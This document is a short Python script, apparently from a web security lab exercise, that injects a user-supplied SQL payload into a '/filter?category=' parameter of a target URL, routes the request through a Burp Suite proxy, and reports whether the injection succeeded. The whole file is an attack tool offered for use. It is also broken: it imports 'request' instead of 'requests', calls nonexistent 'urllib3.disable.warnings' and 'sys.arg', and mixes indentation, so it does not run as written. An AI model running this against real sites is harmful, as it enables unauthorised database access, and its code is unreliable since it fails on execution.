#SQLi in WHERE Clause
#This script has two parameters: Target URL and Payload you want to inject.

import request
import sys
import urllib3

urllib3.disable.warnings(urllib3.exceptions.InsecureRequestWarning)

#Send Request to Burp Proxy:

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}  #Proxy setting: Whenever request made in the script will pass through Burp Suite Proxy

#Explotation:

def exploit_sqli(url, payload):
	uri = '/filter?category='
	req = requests.get(url + uri + payload, verify=False, proxies=proxies)
        if "Pet Experience" in req.text:
		return True
	else:
		return False


#Arguments:

if __name__ == "__main__":
	try:
		url = sys.arg[1].strip()
		payload = sys.argv[2].strip()
		
        except IndexError:
		print("[-] Usage: %s <url> <payload>" % sys.argv[0])
		print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
		sys.exit(-1)


#Evaluation of SQL Injection: 

if exploit_sqli(url, payload):
	print("[+] SQL Injection Successful!")
else:
	print("[-] SQL Injection Unsuccesful!")
